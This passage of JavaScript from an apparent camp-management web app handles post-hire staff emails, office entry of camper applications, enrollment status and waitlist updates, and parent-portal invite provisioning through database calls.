    return window.location.origin+'/campistry_posthire.html?id='+encodeURIComponent(id)+'&camp='+encodeURIComponent(getCampId());
}
function openSendPostHireModal(id){
    var a=staffApplications[id]; if(!a){toast('Application not found','error');return;}
    if(!a.email){toast('No email on file for this applicant','error');return;}
    var url=_postHireUrl(id);
    document.getElementById('slTitle').textContent='Send Post-Hire Form';
    var h='<div class="fg"><label class="fl">To</label><input class="fi" value="'+esc(a.email)+'" disabled></div>';
    h+='<div class="fg"><label class="fl">Subject</label><input class="fi" id="slSubject" value="'+esc('A few more details for '+(a.name||'your onboarding'))+'"></div>';
    h+='<div class="fg"><label class="fl">Message</label><textarea class="fi" id="slBodyText" style="min-height:110px;resize:vertical">'+esc('Welcome to the team, '+((a.first||a.name||'').split(' ')[0]||'')+'! Please complete a few more details here:\n\n'+url)+'</textarea></div>';
    document.getElementById('slBody').innerHTML=h;
    var btn=document.getElementById('slSendBtn');
    if(btn){ btn.disabled=false; btn.textContent='Send'; btn.onclick=function(){ _sendPostHireNow(id); }; }
    openModal('sendLinkModal');
}
async function _sendPostHireNow(id){
    var a=staffApplications[id]; if(!a)return;
    var subject=(document.getElementById('slSubject')?.value||'').trim();
    var body=(document.getElementById('slBodyText')?.value||'').trim();
    if(!body){toast('Enter a message','error');return;}
    var campName='';try{var ss=JSON.parse(localStorage.getItem('campGlobalSettings_v1')||'{}');campName=ss.campName||ss.camp_name||'Camp';}catch(ex){}
    var btn=document.getElementById('slSendBtn');
    if(btn){btn.disabled=true;btn.textContent='Sending…';}
    try{
        await callEdgeFunctionAuthed('send-broadcast',{campId:getCampId(),to:[{email:a.email,name:a.name||''}],subject:subject,body:body,method:'email',campName:campName});
        a.postHireSentDate=new Date().toISOString();
        save();
        toast('Post-hire form sent to '+a.email);
        closeModal('sendLinkModal');
    }catch(err){
        toast('Send failed: '+(err&&err.message||'unknown error'),'error');
    }finally{
        if(btn){btn.disabled=false;btn.textContent='Send';}
    }
}
// Fires only when the camp turned "Send automatically on hire" on in the
// Post-Hire Form builder — silent (toast only), no confirm modal, since
// the office already opted into hands-off sending.
async function _autoSendPostHire(id){
    var a=staffApplications[id]; if(!a||!a.email)return;
    var url=_postHireUrl(id);
    var campName='';try{var ss=JSON.parse(localStorage.getItem('campGlobalSettings_v1')||'{}');campName=ss.campName||ss.camp_name||'Camp';}catch(ex){}
    var subject='A few more details for '+(a.name||'your onboarding');
    var body='Welcome to the team, '+((a.first||a.name||'').split(' ')[0]||'')+'! Please complete a few more details here:\n\n'+url;
    try{
        await callEdgeFunctionAuthed('send-broadcast',{campId:getCampId(),to:[{email:a.email,name:a.name||''}],subject:subject,body:body,method:'email',campName:campName});
        a.postHireSentDate=new Date().toISOString();
        save();
        toast('Post-hire form auto-sent to '+a.email);
    }catch(err){
        toast('Auto-send of post-hire form failed: '+(err&&err.message||'unknown error'),'error');
    }
}

// Maps FC_FIELD_CATALOG ids to the enrollment-record field name the public
// registration form (campistry_register.html submitApp()) saves under, plus
// an input type/options where it isn't plain text. Keeping these names in
// sync means an office-entered application and a parent-submitted one are
// indistinguishable to viewApplication()/printApplication()/etc.
var APP_FIELD_MAP={
    first:{rec:'camperFirst'},last:{rec:'camperLast'},
    dob:{rec:'dob',type:'date'},gender:{rec:'gender',type:'select',opts:['Male','Female','Non-binary','Other']},
    school:{rec:'school'},schoolGrade:{rec:'schoolGrade',type:'select',opts:SCHOOL_GRADE_CATALOG},teacher:{rec:'teacher'},photo:{rec:'camperPhoto',type:'file'},
    parentName:{rec:'parentName'},parentRelation:{rec:'parentRelation'},
    parentPhone:{rec:'parentPhone',type:'tel'},parentEmail:{rec:'parentEmail',type:'email'},
    parent2Name:{rec:'parent2Name'},parent2Relation:{rec:'parent2Relation'},
    parent2Phone:{rec:'parent2Phone',type:'tel'},parent2Email:{rec:'parent2Email',type:'email'},
    street:{rec:'street'},city:{rec:'city'},state:{rec:'state'},zip:{rec:'zip'},
    emName:{rec:'emergencyName'},emRelation:{rec:'emergencyRel'},emPhone:{rec:'emergencyPhone',type:'tel'},
    allergies:{rec:'allergies'},medications:{rec:'medications'},dietary:{rec:'dietary'},medicalNotes:{rec:'medicalNotes',type:'textarea'},
    bunkmate:{rec:'bunkmate'},separate:{rec:'separateFrom'},
    shirt:{rec:'tshirtSize',type:'select',opts:['YS','YM','YL','AS','AM','AL','AXL']},
    source:{rec:'source'},notes:{rec:'notes',type:'textarea'}
};

// Manual Entry's photo field — reuses the same _downscaleImage() the Form
// Builder's logo picker uses, writing the resulting data URL into the
// hidden input the generic values[] reader already picks up.
function _onAppPhotoPick(input,targetId){
    var f=input.files&&input.files[0]; if(!f)return;
    if(!/^image\//.test(f.type)){ toast('Please choose an image file','error'); input.value=''; return; }
    _downscaleImage(f,480,function(dataUrl){
        var el=document.getElementById(targetId); if(el)el.value=dataUrl;
        var prev=document.getElementById(targetId+'_prev');
        if(prev){ prev.src=dataUrl; prev.style.display='block'; }
    });
}

// Manual Entry mirrors whatever the camp has configured in Customize
// Registration Form — same sections (in the same order, skipping any the
// camp turned off), same field labels/required-ness, same custom questions
// — so office staff see exactly what parents see on the real form instead
// of a fixed set that can drift out of sync with it.
function addApplication(){
    var fc=getFormConfig();
    var sesOpts=sessions.map(function(s){return'<option value="'+esc(s.name)+'">'+esc(s.name)+' — '+fm(s.tuition)+'</option>'}).join('');
    var order=(fc.sectionOrder&&fc.sectionOrder.length)?fc.sectionOrder:FC_SECTIONS.map(function(s){return s.key});
    var secEnabled={};
    FC_SECTIONS.forEach(function(s){ secEnabled[s.key]=fc.sections&&fc.sections[s.key]?fc.sections[s.key].enabled:s.default; });

    var h='<div class="fg"><label class="fl">Session</label><select id="appSession" class="fs"><option value="">— Select —</option>'+sesOpts+'</select></div>';

    function fieldHtml(f){
        var cfg=(fc.fields&&fc.fields[f.id])||{};
        if(cfg.enabled===false)return '';
        var map=APP_FIELD_MAP[f.id]||{};
        var label=cfg.label||f.label;
        var req=cfg.required!=null?cfg.required:!!f.required;
        var id='app_'+f.id;
        var star=req?' <span class="rq" style="color:var(--err)">*</span>':'';
        if(map.type==='select'){var _opts=f.id==='schoolGrade'?_schoolGradeCatalog():map.opts;return '<div class="fg"><label class="fl">'+esc(label)+star+'</label><select id="'+id+'" class="fs"><option value="">—</option>'+_opts.map(function(o){return'<option>'+o+'</option>';}).join('')+'</select></div>';}
        if(map.type==='textarea')return '<div class="fg"><label class="fl">'+esc(label)+star+'</label><textarea id="'+id+'" class="fi" style="min-height:50px;resize:vertical"></textarea></div>';
        if(map.type==='file')return '<div class="fg"><label class="fl">'+esc(label)+star+'</label>'
            +'<input type="hidden" id="'+id+'">'
            +'<div style="display:flex;align-items:center;gap:10px">'
            +'<img id="'+id+'_prev" src="" style="display:none;width:48px;height:48px;object-fit:cover;border-radius:8px;border:1px solid var(--s200);flex-shrink:0">'
            +'<input type="file" accept="image/*" class="fi" style="padding:6px 8px" onchange="CampistryMe._onAppPhotoPick(this,\''+id+'\')">'
            +'</div></div>';
        return '<div class="fg"><label class="fl">'+esc(label)+star+'</label><input type="'+(map.type||'text')+'" id="'+id+'" class="fi"></div>';
    }

    order.forEach(function(sectionKey){
        if(!secEnabled[sectionKey])return;
        var catalog=FC_FIELD_CATALOG[sectionKey];
        if(!catalog)return; // documents/payment/signature/siblings — office entry doesn't collect these
        var sec=FC_SECTIONS.filter(function(s){return s.key===sectionKey;})[0];
        var rows=catalog.map(fieldHtml).filter(Boolean);
        if(!rows.length)return;
        h+='<div class="fsec">'+esc(sec.label)+'</div>';
        for(var i=0;i<rows.length;i+=2){
            h+=rows[i+1]?('<div class="fr">'+rows[i]+rows[i+1]+'</div>'):rows[i];
        }
    });

    if(fc.customQuestions&&fc.customQuestions.length){
        h+='<div class="fsec">Additional Information</div>';
        fc.customQuestions.forEach(function(q,i){
            var star=q.required?' <span class="rq" style="color:var(--err)">*</span>':'';
            h+='<div class="fg"><label class="fl">'+esc(q.label)+star+'</label>';
            if(q.type==='textarea')h+='<textarea id="appCq'+i+'" class="fi" style="min-height:50px;resize:vertical"></textarea>';
            else if(q.type==='select')h+='<select id="appCq'+i+'" class="fs"><option value="">—</option>'+(q.options||[]).map(function(o){return'<option>'+esc(o)+'</option>';}).join('')+'</select>';
            else if(q.type==='yesno')h+='<select id="appCq'+i+'" class="fs"><option value="">—</option><option>Yes</option><option>No</option></select>';
            else if(q.type==='checkbox'){(q.options||[]).forEach(function(o){h+='<label style="display:flex;align-items:center;gap:6px;padding:3px 0;font-size:.85rem"><input type="checkbox" class="appCqCb" data-q="'+i+'" value="'+esc(o)+'">'+esc(o)+'</label>';});}
            else h+='<input type="text" id="appCq'+i+'" class="fi">';
            h+='</div>';
        });
    }

    showModal('New Application',h,async function(){
        var values={},missingLabel=null;
        order.forEach(function(sectionKey){
            if(!secEnabled[sectionKey])return;
            var catalog=FC_FIELD_CATALOG[sectionKey];
            if(!catalog)return;
            catalog.forEach(function(f){
                var cfg=(fc.fields&&fc.fields[f.id])||{};
                if(cfg.enabled===false)return;
                var el=document.getElementById('app_'+f.id);
                if(!el)return;
                var val=(el.value||'').trim();
                values[f.id]=val;
                var req=cfg.required!=null?cfg.required:!!f.required;
                if(req&&!val&&!missingLabel)missingLabel=cfg.label||f.label;
            });
        });
        if(!missingLabel){
            (fc.customQuestions||[]).forEach(function(q,i){
                if(missingLabel||!q.required)return;
                if(q.type==='checkbox'){
                    if(!document.querySelector('.appCqCb[data-q="'+i+'"]:checked'))missingLabel=q.label;
                }else if(!(document.getElementById('appCq'+i)?.value||'').trim())missingLabel=q.label;
            });
        }
        if(missingLabel){toast('Enter: '+missingLabel,'error');return;}

        var first=values.first||'',last=values.last||'';
        var camperName=(first+' '+last).trim()||'New Applicant';
        var session=document.getElementById('appSession').value||'';
        var sesObj=sessions.find(function(s){return s.name===session});
        if(sesObj&&sesObj.capacity>0){
            var enrolled=Object.values(enrollments).filter(function(e){return e.session===session&&(e.status==='enrolled'||e.status==='accepted')}).length;
            if(enrolled>=sesObj.capacity){
                var okWl=await confirmDialog({title:'Session at Capacity',message:esc(session)+' is at capacity ('+enrolled+'/'+sesObj.capacity+'). Add this applicant to the waitlist instead?',confirmLabel:'Add to Waitlist',danger:false});
                if(!okWl)return;
            }
        }
        var isWaitlist=!!(sesObj&&sesObj.capacity>0&&Object.values(enrollments).filter(function(e){return e.session===session&&(e.status==='enrolled'||e.status==='accepted')}).length>=sesObj.capacity);
        var tuition=sesObj?sesObj.tuition:0;

        var customAnswers={},customQuestionLabels=[];
        (fc.customQuestions||[]).forEach(function(q,i){
            customQuestionLabels.push(q.label);
            if(q.type==='checkbox'){
                var checked=Array.prototype.map.call(document.querySelectorAll('.appCqCb[data-q="'+i+'"]:checked'),function(c){return c.value;});
                if(checked.length)customAnswers['q'+i]=checked;
            }else{
                var cv=(document.getElementById('appCq'+i)?.value||'').trim();
                if(cv)customAnswers['q'+i]=cv;
            }
        });

        var id='enr_'+Date.now()+'_'+Math.random().toString(36).substr(2,4);
        var rec={
            camperName:camperName,camperFirst:first,camperLast:last,
            dob:values.dob||'',gender:values.gender||'',school:values.school||'',schoolGrade:values.schoolGrade||'',teacher:values.teacher||'',camperPhoto:values.photo||'',
            parentName:values.parentName||'',parentRelation:values.parentRelation||'',parentPhone:values.parentPhone||'',parentEmail:values.parentEmail||'',
            parent2Name:values.parent2Name||'',parent2Relation:values.parent2Relation||'',parent2Phone:values.parent2Phone||'',parent2Email:values.parent2Email||'',
            street:values.street||'',city:values.city||'',state:values.state||'',zip:values.zip||'',
            emergencyName:values.emName||'',emergencyRel:values.emRelation||'',emergencyPhone:values.emPhone||'',
            allergies:values.allergies||'',medications:values.medications||'',dietary:values.dietary||'',medicalNotes:values.medicalNotes||'',
            bunkmate:values.bunkmate||'',separateFrom:values.separate||'',tshirtSize:values.shirt||'',source:values.source||'',notes:values.notes||'',
            session:session,sessionTuition:tuition,
            status:isWaitlist?'waitlisted':'applied',
            appliedDate:new Date().toISOString().split('T')[0],
            formsRequired:3,formsCompleted:0,
            paymentStatus:'pending',paymentAmount:0,
            customAnswers:customAnswers,customQuestionLabels:customQuestionLabels
        };
        enrollments[id]=rec;
        save();closeModal('dynModal');_refreshPplIfActive();
        toast(isWaitlist?camperName+' added to waitlist':camperName+' application received');
    },{maxWidth:720});
}

function updateEnrollStatus(id,status,opts){
    opts=opts||{};
    if(!enrollments[id])return;
    var prev=enrollments[id].status;
    enrollments[id].status=status;
    enrollments[id].statusHistory=enrollments[id].statusHistory||[];
    enrollments[id].statusHistory.push({from:prev,to:status,date:new Date().toISOString(),by:'office'});

    // If declining/withdrawing someone from a full session, auto-promote next waitlisted
    if((status==='declined'||status==='withdrawn')&&prev!=='waitlisted'){
        var session=enrollments[id].session;
        if(session) autoPromoteWaitlist(session);
    }
    // Bulk callers pass silent:true and do one save/render/toast for the whole batch.
    if(!opts.silent){ save();_refreshPplIfActive();toast('Status updated to '+status); }

    // On first acceptance, generate a parent portal invite link (skipped in bulk
    // to avoid a burst of invite generation; the office can invite from the row).
    if(!opts.silent && status==='accepted'&&prev!=='accepted'&&prev!=='enrolled'){
        generateParentInvite(id);
        // Post-acceptance form: only fires if the camp turned "Send automatically
        // on acceptance" on in that form's builder — otherwise the office sends
        // it manually from the applicant's Review panel whenever they're ready.
        try{
            var pfc=getPostAcceptFormConfig();
            if(pfc.autoSend && enrollments[id] && enrollments[id].parentEmail) _autoSendPostAccept(id);
        }catch(ex){}
    }
}

// Bulk approve / waitlist / decline the checked applications in one pass.
function _checkedEnrollIds(){
    return Array.prototype.map.call(document.querySelectorAll('.reg-check:checked'), function(cb){ return cb.dataset.id; });
}
function toggleAllEnroll(cb){
    document.querySelectorAll('.reg-check').forEach(function(x){ x.checked=cb.checked; });
    _updateRegBulkBar();
}
function _updateRegBulkBar(){
    var n=document.querySelectorAll('.reg-check:checked').length;
    var bar=document.getElementById('regBulkBar'); if(bar) bar.style.display=n?'flex':'none';
    var lbl=document.getElementById('regBulkCount'); if(lbl) lbl.textContent=n+' selected';
}
async function bulkEnrollStatus(status){
    var ids=_checkedEnrollIds();
    if(!ids.length){ toast('Select at least one application'); return; }
    var verb=status==='accepted'?'Accepted':status==='declined'?'Declined':status==='waitlisted'?'Waitlisted':(status+'d');
    if(status==='declined'){
        var okDecline=await confirmDialog({title:'Decline Applications?',message:'Decline '+ids.length+' application'+(ids.length>1?'s':'')+'?',confirmLabel:'Decline',danger:true});
        if(!okDecline)return;
    }
    ids.forEach(function(id){ updateEnrollStatus(id,status,{silent:true}); });
    save(); _refreshPplIfActive(); toast(verb+' '+ids.length+' application'+(ids.length>1?'s':''));
}

// ─── PARENT PORTAL INVITE ────────────────────────────────────────────────────

function _genToken(){
    var arr=new Uint8Array(32);
    crypto.getRandomValues(arr);
    return Array.from(arr).map(function(b){return b.toString(16).padStart(2,'0')}).join('');
}
function _genAccessCode(){
    // Omits confusable chars: 0/O, 1/I
    var ch='ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
    var s='';for(var i=0;i<8;i++){if(i===4)s+='-';s+=ch[Math.floor(Math.random()*ch.length)];}
    return s;
}

function _parentPortalUrl(token){
    // Prefer the configured parent-portal domain so links point at the parent
    // site, not the admin origin. When a dedicated domain roots at the portal,
    // cfg alone is the page; on a shared origin we append the filename.
    // Empty config => same-origin (legacy behavior).
    var cfg=(window.__CAMPISTRY_PARENT_URL__||'').replace(/\/+$/,'');
    var base = cfg ? (cfg + '/') : (window.location.href.replace(/[^/]*$/,'') + 'campistry_link_parent.html');
    return base + (base.indexOf('?')>=0?'&':'?') + 'invite=' + token;
}

function generateParentInvite(enrollId){
    _syncParentInviteSnapshot(enrollId,false);
}

// Shared by saveCamper() (after any roster edit) and bunk-staff add/remove —
// find the accepted/enrolled enrollment(s) for a given camper name and
// silently refresh their family's already-issued invite, if any.
function _enrollIdsForCamper(camperName){
    return Object.keys(enrollments).filter(function(id){
        var en=enrollments[id];
        return en&&en.camperName===camperName&&(en.status==='accepted'||en.status==='enrolled');
    });
}
function _syncInvitesForCamper(camperName){
    _enrollIdsForCamper(camperName).forEach(function(id){ _syncParentInviteSnapshot(id,true); });
}

// ═══ CAMPER SESSION LABELS (display only) ════════════════════════════════════
// Access to Link is ENROLLMENT-based (migration 039): a parent has access for as
// long as their camper is enrolled — no session-date window. So we stamp the
// camper's session name/dates for display, but leave accessStart/accessEnd EMPTY
// so the parent RPCs never date-gate. Access ends only when the camper is
// removed (offboarding revoke, migration 034).
function _linkCamperWindow(camperName){
    var names=[], minStart=null, maxEnd=null;
    (_enrollIdsForCamper(camperName)||[]).forEach(function(id){
        var en=enrollments[id]; if(!en||!en.session)return;
        names.push(en.session);
        var s=(sessions||[]).find(function(x){return x.name===en.session;});
        if(s){
            if(s.startDate&&(!minStart||s.startDate<minStart))minStart=s.startDate;
            if(s.endDate&&(!maxEnd||s.endDate>maxEnd))maxEnd=s.endDate;
        }
    });
    return {
        sessionName:names.join(', '),
        sessionStart:minStart||'', sessionEnd:maxEnd||'',
        accessStart:'', accessEnd:''   // empty => no date gating => access = enrolled
    };
}

// ═══ AUTO-PROVISION PARENT SIGN-UP (roster-driven) ═══════════════════════════
// The moment a camper exists in Me with a parent email — CSV import, manual
// add, or edit — that family can sign up in the Link parent app with that
// email (claim_invites_by_email auto-binds on first sign-in, migration 032).
// No manual "generate invites" step. save() schedules this; a content
// signature makes repeat saves free, and upsert_parent_invite dedupes per
// (camp, parent_email) and PRESERVES the existing token + access code, so
// already-shared links never break.
var _apiTimer=null,_apiLastSig='',_apiRunning=false;
function _scheduleAutoParentInvites(){
    clearTimeout(_apiTimer);
    _apiTimer=setTimeout(_autoProvisionParentInvites,4000);
}
function _autoProvisionParentInvites(){
    if(_apiRunning){console.log('[Me] Parent sign-up: skipped — a previous run is still in flight');return;}
    var db=window.CampistryDB&&window.CampistryDB.getClient?window.CampistryDB.getClient():null;
    var campId=window.CampistryDB&&window.CampistryDB.getCampId?window.CampistryDB.getCampId():null;
    if(!db||!campId){console.log('[Me] Parent sign-up: skipped — cloud not ready (db='+!!db+', campId='+!!campId+')');return;}

    // Group campers into families: explicit family records win, remaining
    // roster campers group by shared parent1Email (implied families) — the
    // same rules the Link data bridge uses. Each DISTINCT parent email gets
    // its own entry in `fams` (so, below, its own upsert_parent_invite call
    // and its own independent portal login) — a family with two parents on
    // different emails ends up as two keys sharing the same campers list.
    var fams={},inFamily={};
    Object.keys(families||{}).forEach(function(fk){
        var fam=families[fk];
        var parents=(fam&&fam.households&&fam.households[0]&&fam.households[0].parents)||[];
        var p0=parents[0],p1=parents[1];
        if(p0&&p0.email){
            var key=String(p0.email).toLowerCase();
            if(!fams[key])fams[key]={parentName:p0.name||'',parentEmail:p0.email,campers:[]};
            (fam.camperIds||[]).forEach(function(cn){
                if(roster[cn]&&fams[key].campers.indexOf(cn)<0){fams[key].campers.push(cn);inFamily[cn]=1;}
            });
        }
        if(p1&&p1.email&&String(p1.email).toLowerCase()!==String((p0&&p0.email)||'').toLowerCase()){
            var key2=String(p1.email).toLowerCase();
            if(!fams[key2])fams[key2]={parentName:p1.name||'',parentEmail:p1.email,campers:[]};
            (fam.camperIds||[]).forEach(function(cn){
                if(roster[cn]&&fams[key2].campers.indexOf(cn)<0){fams[key2].campers.push(cn);inFamily[cn]=1;}
            });
        }
    });
    Object.keys(roster).forEach(function(cn){
        if(inFamily[cn])return;
        var c=roster[cn];if(!c)return;
        if(c.parent1Email){
            var key=String(c.parent1Email).toLowerCase();
            if(!fams[key])fams[key]={parentName:c.parent1Name||'',parentEmail:c.parent1Email,campers:[]};
            if(fams[key].campers.indexOf(cn)<0)fams[key].campers.push(cn);
        }
        if(c.parent2Email&&String(c.parent2Email).toLowerCase()!==String(c.parent1Email||'').toLowerCase()){
            var key2=String(c.parent2Email).toLowerCase();
            if(!fams[key2])fams[key2]={parentName:c.parent2Name||'',parentEmail:c.parent2Email,campers:[]};
            if(fams[key2].campers.indexOf(cn)<0)fams[key2].campers.push(cn);
        }
    });

    var keys=Object.keys(fams).filter(function(k){return fams[k].campers.length;});
    if(!keys.length){console.log('[Me] Parent sign-up: skipped — no families with a parent email yet');return;}

    // Skip entirely when nothing invite-relevant changed since the last run.
    // Include each camper's access window so editing SESSION DATES (not just
    // membership) also re-stamps the invites — and bunk/division/grade, since
    // camper_data.staff/counselor/teacher are all derived from the camper's
    // CURRENT bunk (bunkStaff[r.bunk]) at snapshot time. Without these, moving
    // a camper to a new bunk in Bunk Builder never re-stamped the parent's
    // invite (accessStart/accessEnd are always empty per the comment above,
    // so the signature never changed and this bailed out on every save after
    // the first) — the parent portal kept showing the old bunk and old staff
    // indefinitely.
    // Also fold in the CONTENTS of that bunk's staff list (not just which
    // bunk the camper is in) — adding/editing/removing a counselor on a bunk
    // a camper was ALREADY on doesn't change bunk/division/grade at all, so
    // without this the signature stayed identical and the new counselor
    // never reached camper_data.staff either.
    var sig=keys.slice().sort().map(function(k){
        return k+':'+fams[k].campers.slice().sort().map(function(cn){
            var w=_linkCamperWindow(cn);
            var r=roster[cn]||{};
            var staffSig=(bunkStaff[r.bunk]||[]).map(function(s){return (s.name||'')+':'+(s.role||'')+':'+(s.email||'');}).join(',');
            return cn+'@'+w.accessStart+'-'+w.accessEnd+'#'+(r.bunk||'')+'/'+(r.division||'')+'/'+(r.grade||'')+'~'+staffSig;
        }).join('|');
    }).join(';');
    if(sig===_apiLastSig){console.log('[Me] Parent sign-up: skipped — nothing invite-relevant changed since last sync');return;}
    console.log('[Me] Parent sign-up: syncing '+keys.length+' famil'+(keys.length===1?'y':'ies')+' —',sig);

    _apiRunning=true;
    var expires=new Date();expires.setFullYear(expires.getFullYear()+1);
    var rosterNames=Object.keys(roster);   // for the offboarding sweep (fix a)
    var i=0,done=0,failed=0;
    function _finish(){
        _apiRunning=false;
        if(!failed)_apiLastSig=sig;   // retry failures on the next save
        if(done)console.log('[Me] Parent sign-up: '+done+' famil'+(done===1?'y':'ies')+' provisioned/refreshed'+(failed?(' ('+failed+' failed)'):''));
        // Offboarding: revoke any active invite whose children are ALL gone from
        // the roster (last child un-enrolled). Safe — keeps access while any
        // child remains; server no-ops on an empty roster.
        db.rpc('revoke_orphaned_parent_invites',{p_camp_id:campId,p_roster_names:rosterNames}).then(function(res){
            var rev=res&&res.data&&res.data.revoked;
            if(rev)console.log('[Me] Parent sign-up: revoked '+rev+' orphaned invite'+(rev===1?'':'s')+' (children no longer enrolled)');
        }).catch(function(){});
    }
    (function next(){
        if(i>=keys.length){ _finish(); return; }
        var f=fams[keys[i++]];
        var camperData={};
        f.campers.forEach(function(cn){
            var r=roster[cn]||{};
            var _w=_linkCamperWindow(cn);
            camperData[cn]={
                name:cn,dob:r.dob||'',gender:r.gender||'',
                division:r.division||'',grade:r.grade||'',bunk:r.bunk||'',
                session:_w.sessionName,
                sessionStart:_w.sessionStart,sessionEnd:_w.sessionEnd,
                accessStart:_w.accessStart,accessEnd:_w.accessEnd,
                allergies:r.allergies||'',medications:r.medications||'',dietary:r.dietary||'',
                doctor:r.doctor||'',doctorPhone:r.doctorPhone||'',
                insurance:r.insurance||'',policyNum:r.policyNum||'',
                emergencyName:r.emergencyName||'',emergencyPhone:r.emergencyPhone||'',emergencyRel:r.emergencyRel||'',
                parent2Name:r.parent2Name||'',parent2Phone:r.parent2Phone||'',
                staff:bunkStaff[r.bunk]||[],teacher:r.teacher||'',
                counselor:(function(){var st=bunkStaff[r.bunk]||[];var c=st.filter(function(s){return (s.role||'').toLowerCase()==='counselor';})[0];return c?c.name:'';})()
            };
        });
        console.log('[Me] Parent sign-up: upserting '+f.parentEmail+' —',Object.keys(camperData).map(function(cn){return cn+' @ '+camperData[cn].bunk+' (staff: '+camperData[cn].staff.map(function(s){return s.name;}).join(', ')+')';}));
        db.rpc('upsert_parent_invite',{
            p_camp_id:campId,p_token:_genToken(),
            p_parent_name:f.parentName||f.parentEmail,p_parent_email:f.parentEmail,
            p_camper_names:f.campers,p_camper_data:camperData,
            p_expires_at:expires.toISOString()
        }).then(function(res){
            if(!res.error&&res.data&&res.data.success)done++;else{failed++;console.warn('[Me] Parent sign-up: upsert failed for '+f.parentEmail+' —',res.error||res.data);}
            next();
        }).catch(function(){failed++;next();});
    })();
}

function _syncInvitesForBunk(bunkName){
    Object.keys(roster).forEach(function(n){
        if(roster[n].bunk===bunkName)_syncInvitesForCamper(n);
    });
}

// The parent portal reads camper_data as a frozen snapshot captured at
// invite-creation time (see campistry_link_parent.html — claim_parent_invite
// / get_parent_data_by_user just return whatever camper_data upsert_parent_invite
// last wrote). Nothing previously re-pushed that snapshot when the admin
// later edited the camper (bunk, division, allergies, etc.) via the roster
// Edit modal, so a parent who already had portal access would silently keep
// seeing stale data forever. saveCamper() now calls this with silent=true
// after every edit to refresh it in the background.
//
//   silent=false — the explicit "Get Invite Link" action. Creates the
//     invite if none exists yet, and always shows the share modal.
//   silent=true  — background resync only. NEVER creates a brand-new
//     invite/access-code the admin never asked for — it only refreshes an
//     invite that's already active, and never shows any UI.
function _syncParentInviteSnapshot(enrollId,silent){
    var e=enrollments[enrollId]; if(!e)return;
    var parentEmail=e.parentEmail||e.parent1Email||'';
    var r0=roster[e.camperName]||{};
    var parentName=e.parentName||e.parent1Name||r0.parent1Name||'';
    var parent2Email=e.parent2Email||r0.parent2Email||'';
    var parent2Name=e.parent2Name||r0.parent2Name||'';
    // Both parents get their OWN independent portal login — but only when
    // they actually have distinct emails. A shared email means one login
    // for the household, same as before this feature existed.
    if(parent2Email&&parentEmail&&parent2Email.toLowerCase()===parentEmail.toLowerCase())parent2Email='';
    if(!parentEmail&&!parentName)return;

    var db=window.CampistryDB&&window.CampistryDB.getClient?window.CampistryDB.getClient():null;
    var campId=window.CampistryDB&&window.CampistryDB.getCampId?window.CampistryDB.getCampId():null;
    if(!db||!campId){
        if(silent)return;
        console.warn('[Me] Invite: Supabase not ready, showing link only');
        _showInviteModal(enrollId,{email:parentEmail,name:parentName,url:_parentPortalUrl(_genToken())},null);
        return;
    }

    // doUpsert is keyed on WHICH parent's email is asking — each gets their
    // own link_parent_invites row (own token/access_code/user_id), but both
    // resolve to the exact same family/camper snapshot, so either parent's
    // portal shows the same kids, bunk, staff, etc.
    function doUpsert(pEmail,pName){
        if(!pEmail)return Promise.resolve(null);
        // Which campers show up in this parent's portal?
        //  • If the invited camper belongs to a FAMILY, use that family's
        //    members — the family is the source of truth, so removing a camper
        //    from the family also drops them from the parent's portal.
        //  • Otherwise fall back to grouping by parent email (an implied
        //    family), so un-familied siblings still group together.
        // Prefer the family whose household has a parent (EITHER parent slot)
        // matching this invite's email — its members are exactly who should
        // see this portal, regardless of which camper triggered the sync (so
        // a family-less camper who happens to share the email is NOT pulled
        // back in). Fall back to the family that contains the invited camper.
        var famCamperIds=null, _pe=pEmail.toLowerCase();
        Object.keys(families).some(function(fk){
            var parents=(families[fk].households&&families[fk].households[0]&&families[fk].households[0].parents)||[];
            if(parents.some(function(p){return String(p&&p.email||'').toLowerCase()===_pe;})){ famCamperIds=(families[fk].camperIds||[]); return true; }
            return false;
        });
        if(!famCamperIds){
            Object.keys(families).some(function(fk){
                if((families[fk].camperIds||[]).indexOf(e.camperName)>=0){ famCamperIds=(families[fk].camperIds||[]); return true; }
                return false;
            });
        }
        var familyEnrollments=Object.values(enrollments).filter(function(en){
            if(en.status!=='accepted'&&en.status!=='enrolled') return false;
            if(famCamperIds) return famCamperIds.indexOf(en.camperName)>=0;
            var em=(en.parentEmail||en.parent1Email||'').toLowerCase();
            var em2=(en.parent2Email||'').toLowerCase();
            return em===_pe||em2===_pe;
        });
        var camperNames=familyEnrollments.map(function(en){return en.camperName;});
        var camperData={};
        familyEnrollments.forEach(function(en){
            var r=roster[en.camperName]||{};
            var _w=_linkCamperWindow(en.camperName);
            camperData[en.camperName]={
                name:en.camperName,dob:en.dob||r.dob||'',gender:en.gender||r.gender||'',
                division:r.division||'',grade:r.grade||'',bunk:r.bunk||'',
                session:en.session||'',
                sessionStart:_w.sessionStart,sessionEnd:_w.sessionEnd,
                accessStart:_w.accessStart,accessEnd:_w.accessEnd,
                allergies:en.allergies||r.allergies||'',medications:en.medications||r.medications||'',dietary:en.dietary||r.dietary||'',
                doctor:en.doctor||r.doctor||'',doctorPhone:en.doctorPhone||r.doctorPhone||'',
                insurance:en.insurance||r.insurance||'',policyNum:en.policyNum||r.policyNum||'',
                emergencyName:en.emergencyName||r.emergencyName||'',emergencyPhone:en.emergencyPhone||r.emergencyPhone||'',emergencyRel:en.emergencyRel||r.emergencyRel||'',
                parent2Name:en.parent2Name||r.parent2Name||r.parent1Name||'',parent2Phone:en.parent2Phone||r.parent2Phone||r.parent1Phone||'',
                staff:bunkStaff[r.bunk]||[],
                teacher:en.teacher||r.teacher||'',
                counselor:(function(){var st=bunkStaff[r.bunk]||[];var c=st.filter(function(s){return (s.role||'').toLowerCase()==='counselor';})[0];return c?c.name:'';})()
            };
        });

        var token=_genToken();
        var expires=new Date();
        expires.setFullYear(expires.getFullYear()+1);

        return db.rpc('upsert_parent_invite',{
            p_camp_id:     campId,
            p_token:       token,
            p_parent_name: pName||pEmail,
            p_parent_email:pEmail,
            p_camper_names:camperNames,
            p_camper_data: camperData,
            p_expires_at:  expires.toISOString()
        }).then(function(res){
            if(res.error){
                console.error('[Me] upsert_parent_invite error:',res.error.message,res.error);
                return {error:res.error.message};
            }
            var d=res.data;
            if(!d||!d.success){
                console.error('[Me] upsert_parent_invite returned failure:',d);
                return {error:'unknown'};
            }
            return {email:pEmail,name:pName||pEmail,url:_parentPortalUrl(d.token),accessCode:d.access_code||null};
        });
    }

    if(!silent){
